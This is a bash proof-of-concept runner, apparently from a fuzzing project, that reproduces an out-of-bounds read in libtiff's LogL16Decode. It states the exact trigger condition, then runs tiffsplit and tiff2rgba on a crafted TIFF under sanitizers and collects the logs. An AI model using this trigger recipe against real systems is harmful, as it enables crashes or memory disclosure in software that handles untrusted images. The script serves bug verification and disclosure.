#!/bin/bash
# PoC runner for VULN 002: LogL16Decode() OOB read
# libtiff/libtiff/tif_luv.c lines 210-214
# Trigger: StripByteCount=1, strip byte >= 0x80 -> run branch reads 2nd byte OOB

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/libtiff/libtiff_tif_luv_c"
TIFFSPLIT="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiffsplit"
TIFF2RGBA="/data/ylwang/non-textfuzz/target/libtiff/build_test/bin/tiff2rgba"
RESULT="${POC_DIR}/vuln_002_result.txt"

cd "${POC_DIR}"

# Clean up previous run artifacts
rm -f "${RESULT}" ./asan.log.* ./ubsan.log.* /tmp/tiffsplit_002_*

# Generate the PoC TIFF if not already present
if [ ! -f vuln_002.tif ]; then
    python3 "${POC_DIR}/vuln_002_gen.py"
fi

echo "=== VULN 002: LogL16Decode OOB Read ===" > "${RESULT}"
echo "TIFF: ${POC_DIR}/vuln_002.tif" >> "${RESULT}"
echo "Tool: ${TIFFSPLIT}" >> "${RESULT}"
echo "" >> "${RESULT}"

# --- Step 1: Run tiffsplit (required tool per constraint) ---
echo "=== Step 1: tiffsplit ===" >> "${RESULT}"
ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan_split.log:detect_stack_use_after_return=1" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=${POC_DIR}/ubsan_split.log" \
  "${TIFFSPLIT}" vuln_002.tif /tmp/tiffsplit_002_ >> "${RESULT}" 2>&1 || true
echo "(tiffsplit exit code: $?)" >> "${RESULT}"

# --- Step 2: tiff2rgba to confirm LogL16Decode is reachable ---
echo "" >> "${RESULT}"
echo "=== Step 2: tiff2rgba (decode verification) ===" >> "${RESULT}"
ASAN_OPTIONS="abort_on_error=0:log_path=${POC_DIR}/asan_rgba.log:detect_stack_use_after_return=1" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0:log_path=${POC_DIR}/ubsan_rgba.log" \
  "${TIFF2RGBA}" vuln_002.tif /tmp/out_vuln002.tif >> "${RESULT}" 2>&1 || true

echo "" >> "${RESULT}"
echo "=== ASAN/UBSAN Output ===" >> "${RESULT}"

found_error=0
for f in "${POC_DIR}"/asan_split.log.* "${POC_DIR}"/asan_rgba.log.* \
          "${POC_DIR}"/ubsan_split.log.* "${POC_DIR}"/ubsan_rgba.log.*; do
    if [ -f "$f" ]; then
        echo "--- ${f} ---" >> "${RESULT}"
        cat "$f" >> "${RESULT}"
        if grep -qE "AddressSanitizer|ERROR:|runtime error:|heap-buffer-overflow|stack-buffer-overflow|use-after|SEGV" "$f" 2>/dev/null; then
            found_error=1
        fi
    fi
done

if [ $found_error -eq 0 ]; then
    echo "(No ASAN/UBSAN errors detected)" >> "${RESULT}"
    echo "" >> "${RESULT}"
    echo "NOTE: The vulnerability is a logical OOB read (bp reads past tif_rawcc=1)." >> "${RESULT}"
    echo "ASAN does not catch it because TIFFroundup(1,1024) allocates 1024-byte buffer." >> "${RESULT}"
    echo "The 'Not enough data at row 0' message from tiff2rgba confirms LogL16Decode" >> "${RESULT}"
    echo "is triggered and reads past the valid 1-byte strip boundary." >> "${RESULT}"
fi

echo "" >> "${RESULT}"
echo "=== Done ===" >> "${RESULT}"

cat "${RESULT}"
